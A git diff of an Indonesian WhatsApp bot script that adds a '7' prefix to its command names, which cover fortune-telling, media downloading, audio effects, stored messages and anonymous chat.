                 if (!text) throw `*Masukan Link Twitter Image*\n_Contoh :_ ${prefix + command} https://twitter.com/caci_ann/status/1514256565661954050?t=07p_yly64BkdOMmw_UzX6A&s=19`
                 replay(mess.wait)
                 let anu = await fetchJson(api('zenz', '/twitterimage', { url: text }, 'apikey'))
@@ -4862,21 +3842,21 @@ case 'sfile': case 'sfilemobi': {
             }
           break
 //Primbon Menu  ]\\ 
-               case 'nomerhoki': case 'nomorhoki': {
+               case '7nomerhoki': case '7nomorhoki': {
                 if (!Number(text)) throw `*Masukan Nomor !*\n_Contoh:_ ${prefix + command} ${global.pemilik}`
                 let anu = await primbon.nomer_hoki(Number(text))
                 if (anu.status == false) return m.reply(anu.message)
                 XeonBotInc.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
             }
             break
-            case 'artimimpi': case 'tafsirmimpi': {
+            case '7artimimpi': case '7tafsirmimpi': {
                 if (!text) throw `*Masukan Mimpimu !*\n_Contoh:_ ${prefix + command} belanja`
                 let anu = await primbon.tafsir_mimpi(text)
                 if (anu.status == false) return m.reply(anu.message)
                 XeonBotInc.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
             }
             break
-            case 'ramalanjodoh': case 'ramaljodoh': {
+            case '7ramalanjodoh': case '7ramaljodoh': {
                 if (!text) throw `*Masukan nama1,tanggal,bulan,tahun lahir,nama2,tanggal,bulan,tahun lahir*\n_Contoh:_ ${prefix + command} Fazrin, 05, 09, 2005, Nissa, 29, 3, 2006`
                 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
@@ -4884,7 +3864,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
-            case 'ramalanjodohbali': case 'ramaljodohbali': {
+            case '7ramalanjodohbali': case '7ramaljodohbali': {
                 if (!text) throw `*Masukan nama1,tanggal,bulan,tahun lahir,nama2,tanggal,bulan,tahun lahir*\n_Contoh:_  Fazrin, 05, 09, 2005, Nissa, 14, 4, 2006`
                 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                 let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
@@ -4892,7 +3872,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
-            case 'suamiistri': {
+            case '7suamiistri': {
                 if (!text) throw `*Masukan nama1,tanggal,bulan,tahun lahir,nama2,tanggal,bulan,tahun lahir*\n_Contoh:_  Fazrin, 05, 09, 2005, Nissa, 14, 4, 2006`
                 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                 let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
@@ -4900,7 +3880,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
-            case 'ramalancinta': case 'ramalcinta': {
+            case '7ramalancinta': case '7ramalcinta': {
                 if (!text) throw `*Masukan nama1,tanggal,bulan,tahun lahir,nama2,tanggal,bulan,tahun lahir*\n_Contoh:_  Fazrin, 05, 09, 2005, Nissa, 14, 4, 2006`
                 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                 let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
@@ -4908,14 +3888,14 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
-            case 'artinama': {
+            case '7artinama': {
                 if (!text) throw `*Masukan nama !*\n_Contoh:_ ${prefix + command} Fazrin Mauza`
                 let anu = await primbon.arti_nama(text)
                 if (anu.status == false) return m.reply(anu.message)
                 XeonBotInc.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
-            case 'kecocokannama': case 'cocoknama': {
+            case '7kecocokannama': case '7cocoknama': {
                 if (!text) throw `*Masukam nama,tanggal,bulan,tahun lahir*\n_Contoh:_ ${prefix + command} Fazrin, 05, 09, 2005`
                 let [nama, tgl, bln, thn] = text.split`,`
                 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
@@ -4923,7 +3903,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
             }
             break
-            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
+            case '7kecocokanpasangan': case '7cocokpasangan': case '7pasangan': {
                 if (!text) throw `Example : ${prefix + command} Fazrin|Novia`
                 let [nama1, nama2] = text.split`|`
                 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
@@ -4931,7 +3911,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
             }
             break
-            case 'jadianpernikahan': case 'jadiannikah': {
+            case '7jadianpernikahan': case '7jadiannikah': {
                 if (!text) throw `*Masukan tanggal jadian nikah!*\n_Contoh:_  ${prefix + command} 6,12,2022`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
@@ -4939,7 +3919,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
             }
             break
-            case 'sifatusaha': {
+            case '7sifatusaha': {
                 if (!text)throw `*Masukan tanggal usaha berdiri!*\n_Contoh:_ ${prefix+ command} 28, 12, 2021`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
@@ -4947,7 +3927,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
             }
             break
-            case 'rejeki': case 'rezeki': {
+            case '7rejeki': case '7rezeki': {
                 if (!text) throw `*Masukan tanggal,bulan,tahun lahir !*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
@@ -4955,7 +3935,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
-            case 'pekerjaan': case 'kerja': {
+            case '7pekerjaan': case '7kerja': {
                 if (!text) throw `*Masukan tanggal,bulan,tahun lahir !*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
@@ -4963,7 +3943,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
-            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
+            case '7ramalannasib': case '7ramalnasib': case '7nasib': {
                 if (!text) throw `*Masukan tanggal,bulan,tahun lahir !*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
@@ -4971,7 +3951,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
             }
             break
-            case 'potensipenyakit': case 'penyakit': {
+            case '7potensipenyakit': case '7penyakit': {
                 if (!text) throw `*Masukan tanggal,bulan,tahun lahir !*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
@@ -4979,7 +3959,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
-            case 'artitarot': case 'tarot': {
+            case '7artitarot': case '7tarot': {
                 if (!text) throw `*Masukan tanggal,bulan,tahun lahir !*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
@@ -4987,7 +3967,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
-            case 'fengshui': {
+            case '7fengshui': {
                 if (!text) throw `*Masukan nama,gender,tahun lahir*\n_Contoh:_ ${prefix + command} Fazrin,1,2005\n\n_Note : Gender : 1 untuk laki-laki & 2 untuk perempuan_`
                 let [nama, gender, tahun] = text.split`,`
                 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
@@ -4995,7 +3975,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
             }
             break
-            case 'haribaik': {
+            case '7haribaik': {
                 if (!text) throw `*Masukan tanggal,bulan,tahun*\n_Contoh:_ ${prefix + command} 5, 9, 2021`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
@@ -5003,7 +3983,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
-            case 'harisangar': case 'taliwangke': {
+            case '7harisangar': case '7taliwangke': {
                 if (!text) throw `*Masukan tanggal,bulan,tahun*\n_Contoh:_ ${prefix + command} 5, 9, 2021`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
@@ -5011,7 +3991,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
-            case 'harinaas': case 'harisial': {
+            case '7harinaas': case '7harisial': {
                 if (!text) throw `*Masukan tanggal,bulan,tahun*\n_Contoh:_ ${prefix + command} 5, 9, 2021`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
@@ -5019,7 +3999,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
             }
             break
-            case 'nagahari': case 'harinaga': {
+            case '7nagahari': case '7harinaga': {
                 if (!text) throw `*Masukan tanggal,bulan,tahun*\n_Contoh:_ ${prefix + command} 5, 9, 2021`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
@@ -5027,7 +4007,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
-            case 'arahrejeki': case 'arahrezeki': {
+            case '7arahrejeki': case '7arahrezeki': {
                 if (!text) throw `*Masukan tanggal,bulan,tahun*\n_Contoh:_ ${prefix + command} 5, 9, 2021`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
@@ -5035,7 +4015,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
-            case 'peruntungan': {
+            case '7peruntungan': {
                 if (!text) throw `*Masukan nama,tanggal,bulan,tahun lahir,untuk tahun*\n_Contoh:_ ${prefix + command} Fazrin,5, 9, 2005,2022`
                 let [nama, tgl, bln, thn, untuk] = text.split`,`
                 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
@@ -5043,7 +4023,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
-            case 'weton': case 'wetonjawa': {
+            case '7weton': case '7wetonjawa': {
                 if (!text) throw `*Masukan tanggal,bulan,tahun lahir*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.weton_jawa(tgl, bln, thn)
@@ -5051,7 +4031,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
             }
             break
-            case 'sifat': case 'karakter': {
+            case '7sifat': case '7karakter': {
                 if (!text) throw `*Masukan nama,tanggal,bulan,tahun lahir*\n_Contoh:_ ${prefix + command} Fazrin,5, 9, 2005`
                 let [nama, tgl, bln, thn] = text.split`,`
                 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
@@ -5059,7 +4039,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
             }
             break
-            case 'keberuntungan': {
+            case '7keberuntungan': {
                 if (!text) throw `*Masukan nama,tanggal,bulan,tahun lahir*\n_Contoh:_ ${prefix + command} Fazrin,5, 9, 2005`
                 let [nama, tgl, bln, thn] = text.split`,`
                 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
@@ -5067,7 +4047,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
             }
             break
-            case 'memancing': {
+            case '7memancing': {
                 if (!text) throw `*Masukan tanggal,bulan,tahun !*\n_Contoh:_ ${prefix + command} 5, 5, 2022`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
@@ -5075,7 +4055,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
-            case 'masasubur': {
+            case '7masasubur': {
                 if (!text) throw `*Masukan tanggal,bulan,tahun pertama menstruasi,siklus!*\n_Contoh:_ ${prefix + command} 5, 5, 2022,28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                 let [tgl, bln, thn, siklus] = text.split`,`
                 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
@@ -5083,7 +4063,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break        
-case 'zodiak': case 'zodiac': {
+case '7zodiak': case '7zodiac': {
                 if (!text) throw `*Masukan tahun bulan tanggal*\n_Contoh :_ ${prefix+ command} 2005 09 05`
                 let zodiak = [
                     ["capricorn", new Date(1970, 0, 1)],
@@ -5119,7 +4099,7 @@ case 'zodiak': case 'zodiac': {
             }
             break
 
-            case 'umma': case 'ummadl': {
+            case '7umma': case '7ummadl': {
 	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                 let { umma } = require('./lib) scraper')
 		let anu = await umma(isUrl(text)[0])
@@ -5150,7 +4130,7 @@ To download media, please click one of the buttons below or enter the ytmp3/ytmp
 		}
 	    }
 	    break
-        case 'ringtone': {
+        case '7ringtone': {
 		if (!text) throw `_Contoh :_ ${prefix + command} black rover`
         let { ringtone } = require('./lib/scraper')
 		let anu = await ringtone(text)
@@ -5159,11 +4139,11 @@ To download media, please click one of the buttons below or enter the ytmp3/ytmp
 	    }
 	    break
 		
-/*case 'alkitab':  if(!text) throw `Masukan Search Yang Anda Cari`
+/*case '7alkitab':  if(!text) throw `Masukan Search Yang Anda Cari`
 epep = await.fetchJson(`https://melcanz.com/alkitabsearch?q=${text}&apikey=melcantik`)
 break*/
 
-		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
+		   case '7bass': case '7blown': case '7deep': case '7earrape': case '7fast': case '7fat': case '7nightcore': case '7reverse': case '7robot': case '7slow': case '7smooth': case '7squirrel':
                 try {
                 let set
                 if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
@@ -5194,7 +4174,7 @@ break*/
                 reply(e)
                 }
                 break
-case 'clearall':
+case '7clearall':
             // if (!isOwner) return  reply(mess.only.owner)
              anu = await XeonBotInc.chats.all()
              XeonBotInc.setMaxListeners(25)
@@ -5203,7 +4183,7 @@ case 'clearall':
 }
              reply('Sukses delete all chat :)')
              break
-            case 'setcmd': {
+            case '7setcmd': {
                 if (!m.quoted) throw `*Reply sticker/image dengan caption* ${prefix + command} ${prefix}command nya\n\n_Contoh:_ ${prefix + comnand} ${prefix}menu`
                 if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                 if (!text) throw `*Untuk Command Apa?*\n_Contoh:_ ${prefix}menu`
@@ -5219,7 +4199,7 @@ case 'clearall':
                 reply(`Done!`)
             }
             break
-            case 'delcmd': {
+            case '7delcmd': {
             	if (!m.quoted) throw `Reply sticker/image yang menjadi key cmd,untuk di hapus dari database cmd`
                 let hash = m.quoted.fileSha256.toString('base64')
                 if (!hash) throw `No hashes`
@@ -5228,7 +4208,7 @@ case 'clearall':
                 reply(`Done!`)
             }
             break
-            case 'listcmd': {
+            case '7listcmd': {
                 let teks = `
 *Hash List*
 Info: *bold* hash is locked
@@ -5237,7 +4217,7 @@ ${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. 
                 XeonBotInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
             }
             break
-            case 'lockcmd': {
+            case '7lockcmd': {
                 if (!isCreator) throw mess.owner
                 if (!m.quoted) throw 'Reply Message!'
                 if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
@@ -5247,7 +4227,7 @@ ${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. 
                 reply('Done!')
             }
             break
-            case 'addmsg': {
+            case '7addmsg': {
                 if (!m.quoted) throw 'Reply Pesan Untuk Disimpan Dalam Database'
                 if (!text) throw `*Masukan Teks untuk kata kunci pesan!*\n_Contoh:_ ${prefix + command} wow`
                 let msgs = global.db.database
@@ -5260,21 +4240,21 @@ Akses dengan ${prefix}getmsg ${text}
 Lihat list pesan dengan ${prefix}listmsg`)
             }
             break
-            case 'getmsg': {
+            case '7getmsg': {
                 if (!text) throw `*Masukan key message!*\n Lihat list msg dengan ${prefix}listmsg`
                 let msgs = global.db.database
                 if (!(text.toLowerCase() in msgs)) throw `'${text}' not registered in message list`
                 XeonBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
             }
             break
-case 'nuklir': {
+case '7nuklir': {
               if (!text) throw `Example : ${prefix + command} msg name\n\nView message list with ${prefix}listmsg`
                 let msgs = global.db.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' not registered in message list`
                 XeonBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
             }
             break
-            case 'listmsg': {
+            case '7listmsg': {
                 let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
 	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
 		let teks = '「 LIST DATABASE 」\n\n'
@@ -5284,7 +4264,7 @@ case 'nuklir': {
 	        reply(teks)
 	    }
 	    break
-            case 'delmsg': case 'deletemsg': {
+            case '7delmsg': case '7deletemsg': {
             	if (!text) throw `*Masukan key message yang mau di hapus!*\n Lihat list msg dengan ${prefix}listmsg`
 	        let msgs = global.db.database
 	        if (!(text.toLowerCase() in msgs)) return reply(`'${text}' not listed in the message list`)
@@ -5292,7 +4272,7 @@ case 'nuklir': {
 		reply(`Successfully deleted '${text}' from the message list`)
             }
 	    break
-	    case 'anonymous': {
+	    case '7anonymous': {
                 if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
 				this.anonymous = this.anonymous ? this.anonymous : {}
 				let buttons = [{
@@ -5309,7 +4289,7 @@ case 'nuklir': {
                 XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await XeonBotInc.getName(m.sender)} Welcome To Anonymous Chat\n\nClick The Button Below To Find A Partner\`\`\``,  `${global.fake}`, m)
             }
 			break
-case 'sendkontak': case 'sendcontact': {
+case '7sendkontak': case '7sendcontact': {
                 if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
                 this.anonymous = this.anonymous ? this.anonymous : {}
                 let room = Object.values(this.anonymous).find(room => room.check(m.sender))
@@ -5326,7 +4306,7 @@ case 'sendkontak': case 'sendcontact': {
                 XeonBotInc.sendContact(room.a, [room.b.split("@")[0]], msg)
             }
             break
-            case 'stop': case 'keluar': case 'leave': {
+            case '7stop': case '7keluar': case '7leave': {
                 if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
                 this.anonymous = this.anonymous ? this.anonymous : {}
                 let room = Object.values(this.anonymous).find(room => room.check(m.sender))
@@ -5343,7 +4323,7 @@ case 'sendkontak': case 'sendcontact': {
                 delete this.anonymous[room.id]
                 if (command === 'leave') break
             }
-            case 'mulai': case 'start': {
+            case '7mulai': case '7start': {
                 if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
                 this.anonymous = this.anonymous ? this.anonymous : {}
                 if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
@@ -5384,7 +4364,7 @@ case 'sendkontak': case 'sendcontact': {
                 }
                 break
             }
-            case 'skip':  case 'next': case 'lanjut': {
+            case '7skip':  case '7next': case '7lanjut': {
                 if (m.isGroup) return reply('This Feature Cannot Be Used In Group!')
                 this.anonymous = this.anonymous ? this.anonymous : {}
                 let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
@@ -5429,19 +4409,19 @@ case 'sendkontak': case 'sendcontact': {
                 }
                 break
             }
-            case 'public': {
+            case '7public': {
                 if (!isCreator) throw mess.owner
                 XeonBotInc.public = true
                 reply('Successfully Changed To Public Usage')
             }
             break
-            case 'self': {
+            case '7self': {
                 if (!isCreator) throw mess.owner
                 XeonBotInc.public = false
                 reply('Successfully Changed To Self Usage')
             }
             break
-            case 'ping': case 'botstatus': case 'statusbot': {
+            case '7ping': case '7botstatus': case '7statusbot': {
                 const used = process.memoryUsage()
                 const cpus = os.cpus().map(cpu => {
                     cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
@@ -5488,13 +4468,13 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 reply(respon)
             }
             break
-            case 'owner': case 'creator': {
+            case '7owner': case '7creator': {
             XeonBotInc.sendContact(m.chat, global.pemilik, m)
            const devsound = fs.readFileSync('./BotMedia/botdev.mp3') //u can change the music in BotMedia folder
            XeonBotInc.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
             }
             break
-                    case 'bug': case 'report': {
+                    case '7bug': case '7report': {
                     	if(!text) throw `Enter The Bug Example\n\n${prefix + command} Menu Error `
                     	XeonBotInc.sendMessage(`${global.pemilik}@s.whatsapp.net`, {text: `*Bug Report From:* wa.me/${m.sender.split("@")[0]}
 Report Message: ${text}` })
@@ -5502,7 +4482,7 @@ reply(`Successfully Reported To The Owner\n\nPlease Make Sure The Bug Is Valid, 
                     }
                     break 
                     
-case 'tes': case 'test': case 'alive': case 'bot': case 'robot': case 'cheems': case 'doge':{
+case '7tes': case '7test': case '7alive': case '7bot': case '7robot': case '7cheems': case '7doge':{
                           timestampe = speed();
 latensie = speed() - timestampe
   	anu = ` Hi 🤚 ${pushname}
@@ -5556,15 +4536,9 @@ latensie = speed() - timestampe
 How Are You? 😊
 
 
-❏「 INFO BOT 」
-
-𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
